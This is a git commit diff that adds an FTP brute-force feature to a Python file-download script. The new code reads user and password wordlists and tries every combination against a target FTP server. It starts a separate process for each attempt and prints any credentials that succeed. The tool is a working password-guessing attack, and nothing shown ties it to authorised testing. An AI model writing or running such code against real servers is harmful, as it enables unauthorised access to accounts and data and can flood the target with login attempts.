96c5e10c7c62442f01005267f6431e27c7ef2215
gowthamaraj <gowthamaraj360@gmail.com>
2021-04-30 02:38:33 +0530

    add bruteforce

--- script.py
+++ script.py
@@ -1,6 +1,8 @@
 import ftplib
 import argparse
+import multiprocessing
 
+# Test Data
 # FTP_SERVER_URL = 'ftp.be.debian.org'
 # DOWNLOAD_DIR_PATH = '/pub/linux/kernel/v5.x/'
 # DOWNLOAD_FILE_NAME = 'ChangeLog-5.0'
@@ -14,11 +16,15 @@ parse.add_argument('--p',dest='password',default='anonymous', help='Username of 
 parse.add_argument('-d',action='store',dest='dir',help='Directory of the file to be download')
 parse.add_argument('-f',action='store',dest='file',help='Name of the file to be download')
 
+# for Brute foce
+parse.add_argument('-user-file',action='store',dest='brute_users',help='List of Users')
+parse.add_argument('-password-file',action='store',dest='brute_passwords',help='List of Passwords')
+
 
 # Get all the arguments
 args = vars(parse.parse_args())
 
-print(args)
+# print(args)
 
 def ftp_file_download(server, username, password):
     # connect to the FTP server
@@ -35,6 +41,31 @@ def ftp_file_download(server, username, password):
     except Exception as exception:
         print('File could not be downloaded:',exception)
 
+def ftp_brute_force(server, username, password):
+    ftp = ftplib.FTP(server)
+    try:
+        print(f"Testing -> f{username}:{password}")
+        response = ftp.login(username,password)
+        if "230" in response and "granted" in response:
+            print(f"Cracked {username}:{password}")
+    except Exception as E:
+        print('Error : '+str(E))
+
+
 if __name__ == '__main__':
     if args['dir'] and args['file']:
         ftp_file_download(server=args['url'],username=args['username'], password=args['password'])
+    elif args['brute_users'] and args['brute_passwords']:
+        try:
+            with open(args['brute_users']) as users:
+                users = users.readlines()
+            with open(args['brute_passwords']) as passwords:
+                passwords = passwords.readlines()
+            for user in users:
+                for password in passwords:
+                    process = multiprocessing.Process(target=ftp_brute_force,args=(args['url'],user.rstrip(),password.rstrip()))
+                    process.start()
+        except Exception as E:
+            print("Error : "+str(E))
+    else:
+        print("No option selected")
